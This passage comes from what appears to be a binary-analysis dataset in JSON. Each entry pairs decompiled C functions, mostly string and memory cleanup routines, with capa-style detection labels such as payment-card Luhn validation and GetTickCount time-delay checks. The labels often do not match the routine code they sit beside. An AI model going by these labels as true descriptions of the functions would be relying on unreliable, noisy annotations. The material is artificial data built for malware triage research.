        "decompiled_code": "\nvoid fcn.180052840(code **arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    \n    fcn.18003c0b0(arg1 + 0x17, arg2);\n    if (0x7 < arg1[0x12]) {\n        pcVar1 = arg1[0xf];\n        iVar2 = arg1[0x12] * 2;\n        pcVar3 = pcVar1;\n        if (0xfff < iVar2 + 2U) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = iVar2 + 0x29;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x000180052994;\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0x12] = 0x7;\n    arg1[0x11] = NULL;\n    *(arg1 + 0xf) = 0;\n    pcVar4 = arg1[0xe];\n    if (0xf < pcVar4) {\n        pcVar1 = arg1[0xb];\n        pcVar3 = pcVar1;\n        if (0xfff < pcVar4 + 1) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = pcVar4 + 0x28;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x000180052994;\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0xd] = NULL;\n    arg1[0xe] = 0xf;\n    *(arg1 + 0xb) = 0;\n    pcVar4 = arg1[10];\n    if (0xf < pcVar4) {\n        pcVar1 = arg1[7];\n        pcVar3 = pcVar1;\n        if (0xfff < pcVar4 + 1) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = pcVar4 + 0x28;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x000180052994:\n                fcn.1800b3528(iVar2, pcVar4);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[9] = NULL;\n    arg1[10] = 0xf;\n    *(arg1 + 7) = 0;\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] != NULL) {\n        (**0x1800de7d8)(arg1[3], 0xffffffeb);\n        (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n        (**0x1800de680)(arg1[3]);\n    }\n    return;\n}\n",
        "token_count": 720
    },
    "1800529e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800529e0(code **arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    code *arg1_00;\n    ulong in_RDX;\n    \n    fcn.180062f30(arg1 + 0x18, in_RDX);\n    fcn.180048ec0(arg1 + 0x15);\n    fcn.180048ec0(arg1 + 0x12);\n    if (0x7 < arg1[9]) {\n        pcVar2 = arg1[6];\n        iVar1 = arg1[9] * 2;\n        arg1_00 = pcVar2;\n        if (0xfff < iVar1 + 2U) {\n            arg1_00 = *(pcVar2 + -8);\n            if (0x1f < (pcVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(pcVar2 - arg1_00, iVar1 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[9] = 0x7;\n    arg1[8] = NULL;\n    *(arg1 + 6) = 0;\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] == NULL) {\n        return;\n    }\n    (**0x1800de7d8)(arg1[3], 0xffffffeb);\n    (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n    // WARNING: Could not recover jumptable at 0x000180052a9d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de680)(arg1[3]);\n    return;\n}\n",
        "token_count": 427
    },
    "180056fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180056fe0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uchar auStack40 [16];\n    ulong uStack24;\n    ulong uStack16;\n    \n    uVar1 = *(arg1 + 0xc0);\n    uStack24 = 0;\n    uStack16 = 0xf;\n    auStack40[0] = 0;\n    fcn.180011120(auStack40, 0x1800f47e2, 0);\n    fcn.18005bdc0(arg1, auStack40, uVar1);\n    return;\n}\n",
        "token_count": 136
    },
    "18005705": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180057050(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uchar auStack40 [16];\n    ulong uStack24;\n    ulong uStack16;\n    \n    uVar1 = *(arg1 + 0xc0);\n    uStack24 = 0;\n    uStack16 = 0xf;\n    auStack40[0] = 0;\n    fcn.180011120(auStack40, 0x1800f482a, 0);\n    fcn.18005bdc0(arg1, auStack40, uVar1);\n    return;\n}\n",
        "token_count": 134
    },
    "18005ba7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18005ba70(int64_t arg1, int64_t **arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong arg2_00;\n    int64_t iVar7;\n    uchar *arg1_00;\n    int64_t *piVar8;\n    int64_t **arg2_01;\n    int32_t iVar9;\n    int32_t *in_stack_00000028;\n    int32_t *in_stack_00000030;\n    uchar auStack216 [40];\n    ulong uStack176;\n    uchar auStack168 [32];\n    int32_t aiStack136 [2];\n    int64_t **ppiStack128;\n    ulong uStack120;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint64_t uStack88;\n    \n    uStack176 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack216;\n    aiStack136[0] = -1;\n    ppiStack128 = arg2;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack136);\n    if (-1 < aiStack136[0]) {\n        iVar7 = *0x18012a398;\n        if (aiStack136[0] != 0) {\n            iVar7 = *0x18012a3a0;\n        }\n        if (iVar7 == 0) goto code_r0x00018005bb79;\n        uStack104 = *0x180101910;\n        uStack100 = *0x180101914;\n        uStack96 = *0x180101918;\n        uStack92 = *0x18010191c;\n        uStack120._0_1_ = 0;\n        if (arg2[2] == NULL) {\n            cVar4 = fcn.1800602c0(arg1, &uStack120);\n            if (cVar4 != '\\0') goto code_r0x00018005bc0f;\n            if (CONCAT44(uStack92, uStack96) < 0x10) goto code_r0x00018005bb79;\n            iVar7 = CONCAT71(uStack120._1_7_, uStack120);\n            if (0xfff < CONCAT44(uStack92, uStack96) + 1) {\n                iVar6 = iVar7 - *(iVar7 + -8);\n                iVar7 = *(iVar7 + -8);\n                goto joined_r0x00018005bb6d;\n            }\ncode_r0x00018005bb73:\n            fcn.18008fb24(iVar7);\n            goto code_r0x00018005bb79;\n        }\n        if (&uStack120 != arg2) {\n            arg2_01 = arg2;\n            if (0xf < arg2[3]) {\n                arg2_01 = *arg2;\n            }\n            fcn.180011120(&uStack120, arg2_01, arg2[2]);\n        }\ncode_r0x00018005bc0f:\n        iVar6 = *(arg1 + 0xb8) * 0xe8 + *(arg1 + 0x160);\n        if ((arg3 < 0) || (*(iVar6 + 0x90) - *(iVar6 + 0x88) >> 2 <= arg3)) {\n            if (CONCAT44(uStack92, uStack96) < 0x10) goto code_r0x00018005bb79;\n            iVar7 = CONCAT71(uStack120._1_7_, uStack120);\n            if (0xfff < CONCAT44(uStack92, uStack96) + 1) {\n                iVar6 = iVar7 - *(iVar7 + -8);\n                iVar7 = *(iVar7 + -8);\njoined_r0x00018005bb6d:\n                if (0x1f < iVar6 - 8U) goto code_r0x00018005bdad;\n            }\n            goto code_r0x00018005bb73;\n        }\n        iVar5 = *(*(iVar6 + 0x88) + arg3 * 4);\n        iVar9 = (*(*(iVar6 + 0xa0) + arg3 * 4) - arg4) + iVar5;\n        arg1_00 = auStack168;\n        arg2_00 = fcn.18000de50(arg1_00, &uStack120);\n        cVar4 = fcn.180008800(arg1_00, arg2_00);\n        if (cVar4 == '\\0') {\n            *in_stack_00000028 = *(arg1 + 0xb0) + iVar5;\n            iVar9 = *(arg1 + 0xb0) + iVar9;\n        }\n        else {\n            iVar5 = (**0x1800de7f0)(iVar7, 0xa6e, *(arg1 + 0xb0), iVar5);\n            *in_stack_00000028 = iVar5;\n            iVar9 = (**0x1800de7f0)(iVar7, 0xa6e, *(arg1 + 0xb0), iVar9);\n        }\n        *in_stack_00000030 = iVar9;\n        iVar5 = *(arg1 + 0xbc);\n        if (iVar5 <= *in_stack_00000028) {\n            *in_stack_00000028 = iVar5 + -1;\n            iVar5 = *(arg1 + 0xbc);\n        }\n        if (iVar5 <= *in_stack_00000030) {\n            *in_stack_00000030 = iVar5 + -1;\n        }\n        if (0xf < CONCAT44(uStack92, uStack96)) {\n            iVar6 = CONCAT71(uStack120._1_7_, uStack120);\n            iVar7 = iVar6;\n            if ((0xfff < CONCAT44(uStack92, uStack96) + 1) && (iVar7 = *(iVar6 + -8),  0x1f < (iVar6 - iVar7) - 8U))\n            goto code_r0x00018005bdad;\n            fcn.18008fb24(iVar7);\n        }\n        piVar1 = arg2[3];\n        if (piVar1 < 0x10) goto code_r0x00018005bbb8;\n        piVar2 = *arg2;\n        piVar8 = piVar2;\n        if (piVar1 + 1U < 0x1000) {\ncode_r0x00018005bd5a:\n            fcn.18008fb24(piVar8);\n            goto code_r0x00018005bbb8;\n        }\n        piVar8 = piVar2[-1];\n        iVar7 = piVar2 - piVar8;\n        if (iVar7 - 8U < 0x20) goto code_r0x00018005bd5a;\ncode_r0x00018005bda7:\n        fcn.1800b3528(iVar7, piVar1 + 5);\ncode_r0x00018005bdad:\n        fcn.1800b3528();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\ncode_r0x00018005bb79:\n    piVar1 = arg2[3];\n    if (piVar1 < 0x10) goto code_r0x00018005bbb8;\n    piVar2 = *arg2;\n    piVar8 = piVar2;\n    if (0xfff < piVar1 + 1U) {\n        piVar8 = piVar2[-1];\n        iVar7 = piVar2 - piVar8;\n        if (0x1f < iVar7 - 8U) goto code_r0x00018005bda7;\n    }\n    fcn.18008fb24(piVar8);\ncode_r0x00018005bbb8:\n    *arg2 = 0;\n    arg2[3] = 0xf;\n    arg2[2] = NULL;\n    fcn.18008fb00(uStack88 ^ auStack216);\n    return;\n}\n",
        "token_count": 1824
    },
    "18005eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18005eb80(uint64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char cVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t uVar10;\n    uchar auStack152 [32];\n    uint64_t uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint64_t uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uchar uStack72;\n    unkbyte7 Stack71;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack152;\n    uStack56 = *0x180101910;\n    uStack52 = *0x180101914;\n    uStack48 = *0x180101918;\n    uStack44 = *0x18010191c;\n    uStack72 = 0;\n    uVar7 = arg1;\n    cVar5 = fcn.1800602c0(arg1, &uStack72);\n    uVar4 = CONCAT44(uStack44, uStack48);\n    puVar2 = CONCAT71(Stack71, uStack72);\n    if (cVar5 != '\\0') {\n        fcn.1800358e0();\n        uVar8 = 0;\n        uStack104 = 0;\n        uStack96 = 0;\n        puVar9 = &uStack72;\n        if (0xf < uVar4) {\n            puVar9 = puVar2;\n        }\n        uVar3 = CONCAT44(uStack52, uStack56);\n        if (uVar3 < 0x10) {\n            uStack120 = *puVar9;\n            uStack112 = *(puVar9 + 1);\n            uStack108 = *(puVar9 + 0xc);\n            uVar10 = 0xf;\n            uVar8 = uVar7;\n        }\n        else {\n            uVar10 = uVar3 | 0xf;\n            if (0x7fffffffffffffff < uVar10) {\n                uVar10 = 0x7fffffffffffffff;\n            }\n            uVar7 = uVar10 + 1;\n            if (uVar7 < 0x1000) {\n                if (uVar7 != 0) {\n                    uVar8 = fcn.18008fb2c(uVar7);\n                }\n            }\n            else {\n                uVar8 = uVar10 + 0x28;\n                if (uVar8 <= uVar7) {\n                    uVar8 = 0xffffffffffffffff;\n                }\n                iVar6 = fcn.18008fb2c(uVar8);\n                if (iVar6 == 0) goto code_r0x00018005ed0f;\n                uVar8 = iVar6 + 0x27U & 0xffffffffffffffe0;\n                *(uVar8 - 8) = iVar6;\n            }\n            uStack120 = uVar8;\n            fcn.1800ade80(uVar8, puVar9, uVar3 + 1);\n        }\n        uStack104 = uVar3;\n        uStack96 = uVar10;\n        fcn.180035e90(uVar8, &uStack120, arg1 + 0x160);\n    }\n    if (0xf < uVar4) {\n        puVar9 = puVar2;\n        if (0xfff < uVar4 + 1) {\n            puVar9 = puVar2[-1];\n            if (0x1f < puVar2 + (-8 - puVar9)) {\n                fcn.1800b3528();\ncode_r0x00018005ed0f:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(puVar9);\n    }\n    fcn.18008fb00(uStack40 ^ auStack152);\n    return;\n}\n",
        "token_count": 943
    },
    "18006017": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180060170(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar1 = arg1[0xf];\n    if (0xf < uVar1) {\n        iVar3 = arg1[0xc];\n        iVar4 = iVar3;\n        if (0xfff < uVar1 + 1) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = uVar1 + 0x28;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x0001800602b1;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[0xf] = 0xf;\n    arg1[0xe] = 0;\n    *(arg1 + 0xc) = 0;\n    uVar1 = arg1[0xb];\n    if (0xf < uVar1) {\n        iVar3 = arg1[8];\n        iVar4 = iVar3;\n        if (0xfff < uVar1 + 1) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = uVar1 + 0x28;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x0001800602b1;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[10] = 0;\n    arg1[0xb] = 0xf;\n    *(arg1 + 8) = 0;\n    uVar1 = arg1[7];\n    if (0xf < uVar1) {\n        iVar3 = arg1[4];\n        iVar4 = iVar3;\n        if (0xfff < uVar1 + 1) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = uVar1 + 0x28;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x0001800602b1;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[6] = 0;\n    arg1[7] = 0xf;\n    *(arg1 + 4) = 0;\n    if (7 < arg1[3]) {\n        iVar3 = *arg1;\n        iVar5 = arg1[3] * 2;\n        iVar4 = iVar3;\n        if (0xfff < iVar5 + 2U) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = iVar5 + 0x29;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x0001800602b1:\n                fcn.1800b3528(iVar3, iVar5);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 741
    },
    "1800613b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800613b0(void)\n\n{\n    int64_t iVar1;\n    uchar auStack56 [32];\n    int32_t aiStack24 [2];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack56;\n    aiStack24[0] = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack24);\n    if (-1 < aiStack24[0]) {\n        iVar1 = *0x18012a398;\n        if (aiStack24[0] != 0) {\n            iVar1 = *0x18012a3a0;\n        }\n        if (iVar1 != 0) {\n            (**0x1800de7f0)(iVar1, 0x960, 0, 0);\n        }\n    }\n    fcn.18008fb00(uStack16 ^ auStack56);\n    return;\n}\n",
        "token_count": 218
    },
    "18006143": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180011169)\n// WARNING: Removing unreachable block (ram,0x00018001117c)\n// WARNING: Removing unreachable block (ram,0x000180011188)\n// WARNING: Removing unreachable block (ram,0x000180011199)\n// WARNING: Removing unreachable block (ram,0x0001800111a3)\n// WARNING: Removing unreachable block (ram,0x0001800111a7)\n// WARNING: Removing unreachable block (ram,0x0001800111ba)\n// WARNING: Removing unreachable block (ram,0x0001800111be)\n// WARNING: Removing unreachable block (ram,0x0001800111ed)\n// WARNING: Removing unreachable block (ram,0x0001800111ff)\n// WARNING: Removing unreachable block (ram,0x0001800111f2)\n// WARNING: Removing unreachable block (ram,0x0001800111c6)\n// WARNING: Removing unreachable block (ram,0x0001800111cd)\n// WARNING: Removing unreachable block (ram,0x0001800111d1)\n// WARNING: Removing unreachable block (ram,0x0001800111df)\n// WARNING: Removing unreachable block (ram,0x000180011201)\n// WARNING: Removing unreachable block (ram,0x000180011221)\n// WARNING: Removing unreachable block (ram,0x000180011231)\n// WARNING: Removing unreachable block (ram,0x00018001126b)\n// WARNING: Removing unreachable block (ram,0x000180011246)\n// WARNING: Removing unreachable block (ram,0x000180011249)\n// WARNING: Removing unreachable block (ram,0x00018001124e)\n// WARNING: Removing unreachable block (ram,0x000180011265)\n\nulong * fcn.180061430(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    ulong *arg1_01;\n    \n    iVar2 = *(arg1 + 0x168);\n    arg1_00 = *(arg1 + 0x160);\n    if (arg1_00 != iVar2) {\n        do {\n            fcn.180064c70(arg1_00);\n            arg1_00 = arg1_00 + 0xe8;\n        } while (arg1_00 != iVar2);\n        arg1_00 = *(arg1 + 0x160);\n    }\n    puVar1 = arg1 + 0x140;\n    *(arg1 + 0x168) = arg1_00;\n    arg1_01 = puVar1;\n    if (0xf < *(arg1 + 0x158)) {\n        arg1_01 = *puVar1;\n    }\n    *(arg1 + 0x150) = 0;\n    fcn.1800ade80(arg1_01, 0x1800f4bde, 0);\n    *arg1_01 = 0;\n    return puVar1;\n}\n",
        "token_count": 661
    },
    "180062ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180062ea0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    if (*arg1 != 0) {\n        fcn.1800640f0(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        uVar3 = ((arg1[2] - iVar1) / 0x28) * 0x28;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "18006318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180063180(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.180064c70(arg2);\n            arg2 = arg2 + 0xe8;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "1800631d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800631d0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    if (*arg1 != 0) {\n        fcn.180013bc0(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        uVar3 = ((arg1[2] - iVar1) / 0x30) * 0x30;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "18006326": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180063260(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    int64_t in_R8;\n    \n    iVar3 = arg2;\n    if (0xfff < in_R8 * 0xe8) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, in_R8 * 0xe8 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 312
    },
    "1800632b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.1800632b0(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    \n    iVar3 = arg2;\n    if (0xfff < arg3 * 0x28) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, arg3 * 0x28 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 310
    },
    "18006330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180063300(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.180060170(arg2);\n            arg2 = arg2 + 0x88;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "18006334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180063340(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    int64_t in_R8;\n    \n    iVar3 = arg2;\n    if (0xfff < in_R8 * 0x88) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, in_R8 * 0x88 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 312
    },
    "180063f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180063f80(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg1_00;\n    \n    if (arg1 != arg2) {\n        do {\n            if (7 < arg1[3]) {\n                iVar2 = *arg1;\n                iVar1 = arg1[3] * 2;\n                arg1_00 = iVar2;\n                if (0xfff < iVar1 + 2U) {\n                    arg1_00 = *(iVar2 + -8);\n                    if (0x1f < (iVar2 - arg1_00) - 8U) {\n                        fcn.1800b3528(iVar2 - arg1_00, iVar1 + 0x29);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            arg1[2] = 0;\n            arg1[3] = 7;\n            *arg1 = 0;\n            arg1 = arg1 + 5;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "18006401": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180064010(uint64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    \n    if (arg1 != arg2) {\n        puVar7 = arg1 + 7;\n        do {\n            if (7 < *puVar7) {\n                uVar2 = puVar7[-3];\n                iVar6 = *puVar7 * 2;\n                uVar5 = uVar2;\n                if (0xfff < iVar6 + 2U) {\n                    uVar5 = *(uVar2 - 8);\n                    iVar6 = iVar6 + 0x29;\n                    iVar4 = uVar2 - uVar5;\n                    if (0x1f < iVar4 - 8U) goto code_r0x0001800640e3;\n                }\n                fcn.18008fb24(uVar5);\n            }\n            puVar7[-1] = 0;\n            *puVar7 = 7;\n            *(puVar7 + -3) = 0;\n            uVar2 = puVar7[-4];\n            if (0xf < uVar2) {\n                uVar5 = puVar7[-7];\n                arg1_00 = uVar5;\n                if (0xfff < uVar2 + 1) {\n                    arg1_00 = *(uVar5 - 8);\n                    iVar6 = uVar2 + 0x28;\n                    iVar4 = uVar5 - arg1_00;\n                    if (0x1f < iVar4 - 8U) {\ncode_r0x0001800640e3:\n                        fcn.1800b3528(iVar4, iVar6);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            puVar7[-5] = 0;\n            puVar7[-4] = 0xf;\n            *(puVar7 + -7) = 0;\n            puVar1 = puVar7 + 1;\n            puVar7 = puVar7 + 8;\n        } while (puVar1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 537
    },
    "1800640f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
